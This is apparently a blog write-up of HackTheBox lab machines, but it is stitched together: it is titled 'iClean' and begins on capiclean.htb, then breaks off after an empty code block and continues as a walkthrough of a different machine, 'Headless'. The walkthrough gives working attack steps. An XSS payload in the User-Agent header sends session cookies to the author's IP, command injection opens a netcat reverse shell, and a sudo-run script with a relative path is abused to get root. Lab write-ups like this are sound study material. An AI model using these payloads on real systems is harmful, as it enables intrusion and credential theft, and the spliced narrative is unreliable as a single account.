---
layout: post
title: iClean HackTheBox Machine - Writeup
categories: [HackTheBox Machines]
tags: [hackthebox,web,hackthebox easy,linux]
permalink: /posts/headless-htb
image:
  path: /images/htb/easy/headless/icon.png
---

I got through this surprisingly quickly!! Good machine.

**Machine created by:** [dvir1](https://app.hackthebox.com/users/1422414)

## Recon
I start off my recon by doing a portscan of the IP.

```
$sudo nmap -p- -T5 10.10.11.12
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-23 23:27 AEST
...
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp open  http
```

We can see 2 open ports, mainly of interest is HTTP.

I visit [10.10.11.12:80](http://10.10.11.12) and get redirected to `capiclean.htb`, which I put into my `/etc/hosts` file.

After that visiting `capiclean.htb` has a pretty normal cleaning website:
![Front Page](/images/htb/medium/iclean/home.png)

I do alot of exploring and come up blank, so I decide to run `ffuf`.
```
$ ffuf -w ./directory-list-2.3-medium.txt -u "http://capiclean.htb/FUZZ"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://capiclean.htb/FUZZ
 :: Wordlist         : FUZZ: ./directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

...
login                   [Status: 200, Size: 2106, Words: 297, Lines: 88, Duration: 31ms]
services                [Status: 200, Size: 8592, Words: 2325, Lines: 193, Duration: 82ms]
team                    [Status: 200, Size: 8109, Words: 2068, Lines: 183, Duration: 68ms]
quote                   [Status: 200, Size: 2237, Words: 98, Lines: 90, Duration: 66ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 56ms]
dashboard               [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 61ms]
choose                  [Status: 200, Size: 6084, Words: 1373, Lines: 154, Duration: 63ms]
...
```

Checking each of these we see something new on `/quote`.
![Quote](/images/htb/medium/iclean/quote.png)

Sending a quote sends it to the management staff, as it says on the sent page.
![Sent Page](/images/htb/medium/iclean/sent.png)

So can we do session hyjacking? I sent up a payload and a Python3 http.server.

```
```

I click `For questions` and go to a form to contact support:
![Support Contact](/images/htb/easy/headless/support.png)

I try to put in a basic XSS payload in the message field and get a Hacking Attempt warning.
![Hacking Attempt](/images/htb/easy/headless/hackingattempt.png)

But we can control the User-Agent and other headers, so lets try inject an XSS payload to the User-Agent header.

I setup a Python HTTP server on my machine:
```
$ python3 -m http.server 8000
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```

I fire up Burp Suite to get started, and send the following request:
```
POST /support HTTP/1.1
Host: 10.10.11.8:5000
...
User-Agent: <img src=x onerror="this.src=`http://10.10.16.7:8000?${document.cookie}`"/>
...

fname=t&lname=t&email=t%40t.t&phone=0000000000&message=%3Cimg+src%3Dx+onerror%3Dthis.src%3D%60http%3A%2F%2F10.10.16.7%3A8000%3F%24%7Bbtoa%28document.cookie%29%7D%60%2F%3E
```

And we get a response with some new cookies!

```
::ffff:10.10.11.8 - - [23/Apr/2024 23:42:06] "GET /?aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
```

Base64 decoded is the cookie!
```
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

So let's use that cookie and see what we can do!

After some probing it does nothing on `/` or `/support` so I use `ffuf` to check for any more pages:
```
$ ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.11.8:5000/FUZZ"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.8:5000/FUZZ
 :: Wordlist         : FUZZ: ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

...
support                 [Status: 200, Size: 2363, Words: 836, Lines: 93, Duration: 39ms]
dashboard               [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 471ms]
```

Let's check `/dashboard` with the cookies.

![Admin Dash](/images/htb/easy/headless/admindash.png)

## Initial Access & User Flag

Now, we can use dates to check for historical health reports and I bet we can do command injection on the 'date' parameter when we make a requests:
```
POST /dashboard HTTP/1.1
Host: 10.10.11.8:5000
...
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs

date=2023-09-15
```

Let's setup a listener using `pwncat-cs`:
```
$ pwncat-cs
[10:54:21] Welcome to pwncat 🐈!
(local) pwncat$ listen -m linux 4444
[10:55:06] new listener created for 0.0.0.0:4444
```

Alright, time to give this a shot to find command injection. Firstly I try with `2023-09-15;whoami;` as a payload and we get a response:
```
Systems are up and running!
dvir
```

Nice! Let's try get a reverse shell from [RevShells.com](https://revshells.com) and use the `nc mkinfo` payload (URL Encoded).

The payload was this: `2023-09-15;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.16.7%204444%20%3E%2Ftmp%2Ff;`

And we get a response!
```
[11:11:57] 10.10.11.8:46632: registered new host w/ db
           listener: 0.0.0.0:4444: linux session from 10.10.11.8:46632
           established
(local) pwncat$
```

Let's look for that user flag:
```
(remote) dvir@headless:/home/dvir/app$ cd ~
(remote) dvir@headless:/home/dvir$ cat user.txt
839d6fcd010caa4adae6d90528feb207
```

User Flag: <mark>839d6fcd010caa4adae6d90528feb207</mark>

## Root Flag

I instinctinly use `sudo -l` to see if we have any permssions:
```
(remote) dvir@headless:/home/dvir$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

Nice! What can we do with this?
```
$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  1.19, 1.51, 1.02
Database service is not running. Starting it...
```

Not alot of information, let's use `man` to see what we can do with it.

```
#!/bin/bash

if [ "$EUID" ‐ne 0 ]; then
  exit 1 fi

last_modified_time=$(/usr/bin/find  /boot  ‐name ’vmlinuz*’ ‐exec
stat ‐c %Y {} + | /usr/bin/sort ‐n | /usr/bin/tail ‐n 1)  format‐
ted_time=$(/usr/bin/date   ‐d  "@$last_modified_time"  +"%d/%m/%Y
%H:%M") /usr/bin/echo "Last Kernel  Modification  Time:  $format‐
ted_time"

disk_space=$(/usr/bin/df  ‐h / | /usr/bin/awk ’NR==2 {print $4}’)
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk  ‐F’load  average:’
’{print $2}’) /usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep ‐x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null else
  /usr/bin/echo "Database service is running."  fi

exit 0
```

You can see that in these line: `if ! /usr/bin/pgrep ‐x "initdb.sh" &>/dev/null; then` and `./initdb.sh 2>/dev/null else`. It is executing a locally referenced shell file `initdb.sh`.

Let's make a file `initdb.sh`, make the contents `/bin/bash` and make it executable (`chmod +x initdb.sh`).
```
$ echo '/bin/bash' > initdb.sh
$ chmod +x initdb.sh
$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  1.63, 1.74, 1.58
Database service is not running. Starting it...
whoami
root
```

Nice!! Let's read the root flag:
```
cat /root/root.txt
35e912125d9b65b9eddf5d0d1d1702c2
```

Root Flag: <mark>35e912125d9b65b9eddf5d0d1d1702c2</mark>

![Success](/images/htb/easy/headless/submitted.png)

## Thanks for reading!
Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).

You can also find my other contacts on the [whoami](../about) page.